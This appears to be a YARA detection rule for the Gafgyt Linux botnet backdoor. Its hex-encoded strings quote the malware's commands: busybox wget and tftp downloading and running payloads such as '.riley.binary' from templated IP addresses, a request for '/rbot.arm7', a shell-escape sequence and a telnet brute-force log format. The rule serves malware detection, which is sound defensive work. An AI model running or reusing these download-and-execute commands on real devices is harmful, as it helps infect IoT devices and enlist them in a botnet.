
rule Backdoor_Linux_Gafgyt_E_xp{
	meta:
		description = "Backdoor:Linux/Gafgyt.E!xp,SIGNATURE_TYPE_ELFHSTR_EXT,05 00 05 00 08 00 00 03 00 "
		
	strings :
		$a_02_0 = {2f 62 69 6e 2f 62 75 73 79 62 6f 78 20 77 67 65 74 20 68 74 74 70 3a 2f 2f 25 64 2e 25 64 2e 25 64 2e 25 64 2f 90 02 10 2e 73 68 20 2d 4f 2d 20 3e 2e 90 02 10 2e 73 68 65 6c 6c 3b 20 2f 62 69 6e 2f 62 75 73 79 62 6f 78 20 74 66 74 70 20 2d 67 20 2d 6c 20 2e 90 02 10 2e 73 68 65 6c 6c 20 2d 72 20 90 02 10 2e 73 68 20 25 64 2e 25 64 2e 25 64 2e 25 64 3b 20 73 68 20 2e 90 02 10 2e 73 68 65 6c 6c 90 00 } //01 00 
		$a_00_1 = {2f 62 69 6e 2f 62 75 73 79 62 6f 78 20 74 66 74 70 20 2d 67 20 2d 6c 20 2e 72 69 6c 65 79 2e 62 69 6e 61 72 79 20 2d 72 20 25 73 20 25 64 2e 25 64 2e 25 64 2e 25 64 3b 20 2f 62 69 6e 2f 62 75 73 79 62 6f 78 20 63 68 6d 6f 64 20 37 37 37 20 2e 72 69 6c 65 79 2e 62 69 6e 61 72 79 3b 2e 2f 2e 72 69 6c 65 79 2e 62 69 6e 61 72 79 20 74 66 74 70 3b } //01 00  /bin/busybox tftp -g -l .riley.binary -r %s %d.%d.%d.%d; /bin/busybox chmod 777 .riley.binary;./.riley.binary tftp;
		$a_00_2 = {64 72 6f 70 70 65 72 } //01 00  dropper
		$a_00_3 = {47 45 54 20 2f 72 62 6f 74 2e 61 72 6d 37 20 48 54 54 50 2f 31 2e 30 } //01 00  GET /rbot.arm7 HTTP/1.0
		$a_00_4 = {2e 72 62 6f 74 2e 62 69 6e 61 72 79 } //01 00  .rbot.binary
		$a_02_5 = {65 6e 61 62 6c 65 90 02 02 73 79 73 74 65 6d 90 02 02 73 68 65 6c 6c 90 02 02 73 68 90 02 02 70 69 6e 67 20 3b 20 73 68 90 00 } //01 00 
		$a_00_6 = {2f 62 69 6e 2f 62 75 73 79 62 6f 78 20 63 61 74 20 2f 70 72 6f 63 2f 63 70 75 69 6e 66 6f 20 7c 7c 20 77 68 69 6c 65 20 72 65 61 64 20 69 3b 20 64 6f 20 2f 62 69 6e 2f 62 75 73 79 62 6f 78 20 65 63 68 6f 20 24 69 3b 20 64 6f 6e 65 20 3c 20 2f 70 72 6f 63 2f 63 70 75 69 6e 66 6f 20 7c 7c 20 2f 62 69 6e 2f 62 75 73 79 62 6f 78 20 64 64 20 69 66 3d 2f 70 72 6f 63 2f 63 70 75 69 6e 66 6f } //01 00  /bin/busybox cat /proc/cpuinfo || while read i; do /bin/busybox echo $i; done < /proc/cpuinfo || /bin/busybox dd if=/proc/cpuinfo
		$a_00_7 = {5b 25 64 2e 25 64 2e 25 64 2e 25 64 3a 32 33 5d 20 5b 25 73 3a 25 73 5d 20 5b 25 73 5d 20 5b 53 74 61 74 75 73 3a 25 73 5d 20 5b 4d 65 74 68 6f 64 3a 25 64 5d 20 5b 41 74 74 65 6d 70 74 20 23 25 64 } //00 00  [%d.%d.%d.%d:23] [%s:%s] [%s] [Status:%s] [Method:%d] [Attempt #%d
	condition:
		any of ($a_*)
 
}